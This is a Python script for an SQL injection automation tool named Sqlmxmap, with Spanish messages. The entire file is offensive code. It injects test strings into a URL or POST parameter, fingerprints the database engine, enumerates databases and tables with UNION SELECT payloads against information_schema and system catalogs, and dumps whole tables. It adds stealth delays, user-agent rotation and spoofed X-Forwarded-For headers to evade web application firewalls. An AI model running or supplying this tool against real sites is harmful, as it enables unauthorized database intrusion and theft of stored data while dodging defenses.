#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
import argparse
import time
import random
from urllib.parse import urljoin, urlencode, parse_qs, urlparse
from colorama import init, Fore, Style

init(autoreset=True)

banner = f"""
{Fore.RED}
╔════════════════════════════════════════════════════════════════╗
║     ______       _               _                             ║
║    /  ___|     | |             | |                             ║
║    \ `--.  __ _| |_ __ ___   __| |                             ║
║     `--. \/ _` | | '_ ` _ \ / _` |                             ║
║    /\__/ / (_| | | | | | | | (_| |                             ║
║    \____/ \__,_|_|_| |_| |_|\__,_|                             ║
║                                                                ║
║      {Fore.YELLOW}SQL Injection Automation Tool v2.0{Fore.RED} ║
║            {Fore.CYAN}' OR 1=1 -- -{Fore.RED}                  ║
╚════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

class Sqlmxmap:
    def __init__(self, url, param, method="GET", data=None, verbosity=0, stealth=False, waf_evasion=False):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.verbosity = verbosity
        self.stealth = stealth
        self.waf_evasion = waf_evasion
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
        ]
        
    def _get_headers(self):
        headers = {
            "User-Agent": random.choice(self.user_agents) if self.stealth else "Sqlmxmap/2.0"
        }
        if self.waf_evasion:
            headers["X-Forwarded-For"] = "127.0.0.1"
            headers["X-Client-IP"] = "127.0.0.1"
        return headers
    
    def _log(self, msg, level="INFO"):
        if self.verbosity >= 1 or level == "RESULT":
            colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "RESULT": Fore.YELLOW}
            print(f"{colors.get(level, Fore.WHITE)}[{level}] {msg}{Style.RESET_ALL}")
    
    def _send_request(self, payload):
        try:
            if self.method == "GET":
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[self.param] = payload
                new_query = urlencode(params, doseq=True)
                target = parsed._replace(query=new_query).geturl()
                response = self.session.get(target, headers=self._get_headers(), timeout=10)
            else:  # POST
                post_data = self.data.copy() if self.data else {}
                post_data[self.param] = payload
                response = self.session.post(self.url, data=post_data, headers=self._get_headers(), timeout=10)
            
            if self.verbosity >= 2:
                self._log(f"Payload: {payload} | Status: {response.status_code} | Length: {len(response.text)}")
            
            time.sleep(0.5 if self.stealth else 0.1)
            return response.text, response.status_code
        except Exception as e:
            self._log(f"Error: {str(e)}", "ERROR")
            return None, None
    
    def is_vulnerable(self):
        self._log("Probando vulnerabilidad a SQLi...")
        test_payloads = ["'", "\"", "' OR '1'='1", "' AND '1'='2"]
        
        for payload in test_payloads:
            response, status = self._send_request(payload)
            if response:
                if "mysql" in response.lower() or "sql" in response.lower() or "syntax" in response.lower():
                    self._log(f"¡VULNERABLE detectado con: {payload}!", "SUCCESS")
                    return True
        return False
    
    def detect_db(self):
        self._log("Detectando motor de base de datos...")
        signatures = {
            "MySQL": ["@@version", "version()", "mysql"],
            "PostgreSQL": ["version()", "postgresql", "pg_sleep"],
            "MSSQL": ["@@version", "sql server"],
            "Oracle": ["dual", "oracle", "rownum"]
        }
        
        for db, signs in signatures.items():
            for sign in signs:
                payload = f"' UNION SELECT {sign} -- -"
                response, _ = self._send_request(payload)
                if response and sign.lower() in response.lower():
                    self._log(f"Base de datos detectada: {db}", "SUCCESS")
                    return db
        self._log("No se pudo detectar DB específica", "ERROR")
        return "Unknown"
    
    def extract_data(self, query, column_count=1):
        self._log(f"Ejecutando: {query}")
        extracted = ""
        
        for i in range(1, 100):
            if self.stealth and i % 10 == 0:
                time.sleep(random.uniform(1, 3))
            
            payload = f"' UNION SELECT {query} LIMIT {i},1 -- -"
            response, _ = self._send_request(payload)
            
            if response and len(response) > 100:
                # Extracción simplificada - en realidad necesitarías parsing
                extracted += response[:200]
                self._log(f"Extraído: {response[:100]}...", "RESULT")
            else:
                break
        return extracted
    
    def get_databases(self):
        self._log("Extrayendo bases de datos...", "INFO")
        payloads = [
            "' UNION SELECT schema_name FROM information_schema.schemata -- -",
            "' UNION SELECT datname FROM pg_database -- -",
            "' UNION SELECT name FROM master.dbo.sysdatabases -- -"
        ]
        
        dbs = []
        for payload in payloads:
            response, _ = self._send_request(payload)
            if response and ("information_schema" in response or "mysql" in response):
                # Extracción básica
                dbs.append("DB encontrada (revisar respuesta)")
                self._log(f"Posible DB: {response[:200]}", "RESULT")
        return dbs
    
    def get_tables(self, database):
        self._log(f"Extrayendo tablas de {database}...", "INFO")
        payload = f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' -- -"
        response, _ = self._send_request(payload)
        if response:
            self._log(f"Tablas posibles: {response[:200]}", "RESULT")
        return response
    
    def dump_table(self, table):
        self._log(f"Volcando datos de {table}...", "INFO")
        payload = f"' UNION SELECT * FROM {table} -- -"
        response, _ = self._send_request(payload)
        if response:
            self._log(f"Datos: {response[:500]}", "RESULT")
        return response

def main():
    print(banner)
    
    parser = argparse.ArgumentParser(description="Sqlmxmap - SQL Injection Tool Full", 
                                     epilog="Ejemplo: python sqlmxmap.py -u http://test.com/page.php?id=1 --dbs -v")
    parser.add_argument("-u", "--url", required=True, help="URL objetivo")
    parser.add_argument("-p", "--param", default="id", help="Parámetro a inyectar")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="Método HTTP")
    parser.add_argument("-d", "--data", help="Datos POST (formato: 'key1=value1&key2=value2')")
    parser.add_argument("-v", "--verbose", action="count", default=0, help="Modo verboso (-v, -vv)")
    parser.add_argument("--stealth", action="store_true", help="Modo stealth (delay y rotación UA)")
    parser.add_argument("--waf-evasion", action="store_true", help="Evasión básica de WAF")
    parser.add_argument("--dbs", action="store_true", help="Enumerar bases de datos")
    parser.add_argument("--tables", help="Enumerar tablas de una DB específica")
    parser.add_argument("--dump", help="Volcar datos de una tabla específica")
    parser.add_argument("--detect-db", action="store_true", help="Detectar motor de DB")
    
    args = parser.parse_args()
    
    # Procesar datos POST
    post_data = None
    if args.method == "POST" and args.data:
        post_data = dict(item.split("=") for item in args.data.split("&"))
    
    # Crear instancia
    tool = Sqlmxmap(
        url=args.url, 
        param=args.param,
        method=args.method,
        data=post_data,
        verbosity=args.verbose,
        stealth=args.stealth,
        waf_evasion=args.waf_evasion
    )
    
    # Ejecutar acciones
    if not tool.is_vulnerable():
        print(f"{Fore.RED}[!] No se detectó vulnerabilidad evidente{Style.RESET_ALL}")
        if input("¿Continuar igual? (s/n): ").lower() != "s":
            sys.exit(0)
    
    if args.detect_db:
        tool.detect_db()
    
    if args.dbs:
        tool.get_databases()
    
    if args.tables:
        tool.get_tables(args.tables)
    
    if args.dump:
        tool.dump_table(args.dump)
    
    # Si no hay comandos específicos, mostrar ayuda
    if not (args.dbs or args.tables or args.dump or args.detect_db):
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupción detectada. Saliendo...{Style.RESET_ALL}")
        sys.exit(0)
